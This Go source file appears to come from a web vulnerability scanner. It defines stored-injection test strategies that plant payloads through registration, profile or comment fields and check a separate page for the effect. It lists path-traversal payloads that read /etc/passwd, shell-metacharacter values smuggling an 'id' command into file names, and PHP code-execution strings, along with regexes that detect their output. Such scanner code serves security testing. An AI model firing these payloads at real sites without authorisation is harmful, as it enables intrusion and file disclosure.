package secondorder

// Stored-variant strategies (AWVS post-scan tests 4–8): inject a payload
// via one endpoint that persists it (registration, profile update,
// comment), then verify on a separate render endpoint that the payload
// triggered or that its side-effect surfaces (LFI file content, command
// output, PHP execution markers).
//
// These extend the secondorder package beyond the original blind-XSS /
// stored-SQLi / log-injection / JNDI-headers set.

const (
	StrategyStoredLFI      = "StoredLFI"
	StrategyStoredCmdExec  = "StoredCmdExec"
	StrategyStoredCodeExec = "StoredPHPCodeExec"
)

func storedLFIStrategy() Strategy {
	return Strategy{
		Name: StrategyStoredLFI,
		Description: "Inject directory-traversal payloads in stored fields " +
			"(username, profile, comment). Trigger via search/report/render endpoints.",
		InjectPoints: []InjectPoint{
			{Location: "body", Field: "username"},
			{Location: "body", Field: "avatar"},
			{Location: "body", Field: "profile"},
			{Location: "body", Field: "filename"},
		},
		VerifyPoints: []VerifyPoint{
			{Location: "response_body", Pattern: `(?i)(root:[x*]?:0:0|\[boot loader\]|<\?php)`},
		},
		PayloadType: "lfi",
	}
}

func storedCmdExecStrategy() Strategy {
	return Strategy{
		Name: StrategyStoredCmdExec,
		Description: "Inject shell-metacharacter payloads in stored fields. " +
			"Trigger via render or scheduled-job endpoints.",
		InjectPoints: []InjectPoint{
			{Location: "body", Field: "filename"},
			{Location: "body", Field: "image"},
			{Location: "body", Field: "callback"},
			{Location: "body", Field: "command"},
		},
		VerifyPoints: []VerifyPoint{
			{Location: "response_body", Pattern: `(?i)(uid=\d+\(|gid=\d+\(|groups=\d+\()`},
			{Location: "callback", Pattern: ""},
		},
		PayloadType: "cmdi",
	}
}

func storedCodeExecStrategy() Strategy {
	return Strategy{
		Name: StrategyStoredCodeExec,
		Description: "Inject PHP code in stored fields rendered through include()/eval(). " +
			"Trigger via the file the stored value lands in.",
		InjectPoints: []InjectPoint{
			{Location: "body", Field: "filename"},
			{Location: "body", Field: "template"},
			{Location: "body", Field: "include"},
		},
		VerifyPoints: []VerifyPoint{
			{Location: "response_body", Pattern: `(?i)(PHP Version|phpinfo|<title>phpinfo)`},
			{Location: "response_body", Pattern: `assay-stored-rce-ok`},
		},
		PayloadType: "phpcode",
	}
}

func storedLFIPayloads() []string {
	return []string{
		"../../../../etc/passwd",
		"../../../../../../etc/passwd%00",
		"..\\..\\..\\..\\windows\\win.ini",
		"php://filter/convert.base64-encode/resource=index.php",
		"/etc/passwd",
		"file:///etc/passwd",
	}
}

func storedCmdExecPayloads() []string {
	return []string{
		"x.jpg;id",
		"x.jpg|id",
		"x.jpg`id`",
		"x.jpg$(id)",
		"x.jpg && id",
		"\";id;\"",
	}
}

func storedCodeExecPayloads() []string {
	return []string{
		"<?php phpinfo(); ?>",
		"<?php system('id'); ?>",
		"<?php echo 'assay-stored-rce-ok'; ?>",
		"<?=`id`?>",
	}
}

// DefaultStoredLFIStrategy returns a configured StoredLFI strategy with
// inject/verify URLs pre-populated. Mirrors DefaultBlindXSSStrategy's shape.
func DefaultStoredLFIStrategy(injectURL, verifyURL string) Strategy {
	s := storedLFIStrategy()
	s.InjectURL = injectURL
	s.InjectParam = "filename"
	s.VerifyURL = verifyURL
	s.Payloads = storedLFIPayloads()
	return s
}

// DefaultStoredCmdExecStrategy returns a configured StoredCmdExec strategy.
func DefaultStoredCmdExecStrategy(injectURL, verifyURL string) Strategy {
	s := storedCmdExecStrategy()
	s.InjectURL = injectURL
	s.InjectParam = "filename"
	s.VerifyURL = verifyURL
	s.Payloads = storedCmdExecPayloads()
	return s
}

// DefaultStoredCodeExecStrategy returns a configured StoredPHPCodeExec strategy.
func DefaultStoredCodeExecStrategy(injectURL, verifyURL string) Strategy {
	s := storedCodeExecStrategy()
	s.InjectURL = injectURL
	s.InjectParam = "template"
	s.VerifyURL = verifyURL
	s.Payloads = storedCodeExecPayloads()
	return s
}
